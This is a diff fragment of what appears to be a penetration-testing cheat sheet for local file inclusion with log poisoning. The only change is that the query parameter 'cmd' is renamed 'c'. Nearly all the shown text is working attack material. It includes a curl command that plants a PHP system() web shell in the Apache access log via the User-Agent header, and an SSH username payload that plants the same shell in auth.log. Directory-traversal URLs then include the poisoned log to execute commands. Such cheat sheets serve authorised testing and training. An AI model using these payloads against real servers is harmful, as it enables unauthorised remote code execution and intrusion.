@@ -101,11 +101,11 @@ Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/apach
 
 // Must have the ability to read the log file 
 
-Payload: curl "http://192.168.8.108/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>" 
+Payload: curl "http://192.168.8.108/" -H "User-Agent: <?php system(\$_GET['c']); ?>" 
 
 // Replace IP with your target 
 
-Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log&cmd=id
+Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log&c=id
 
 OR
 python -m SimpleHTTPServer 9000 
@@ -129,11 +129,11 @@ Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.
 
 // Must have the ability to read the log file
 
-Payload: ssh <?php system($_GET['cmd']);?>@<target_ip>
+Payload: ssh <?php system($_GET['c']);?>@<target_ip>
 
 // Replace with the target IP
 
-Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log&cmd=id
+Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log&c=id
 
 ```
 
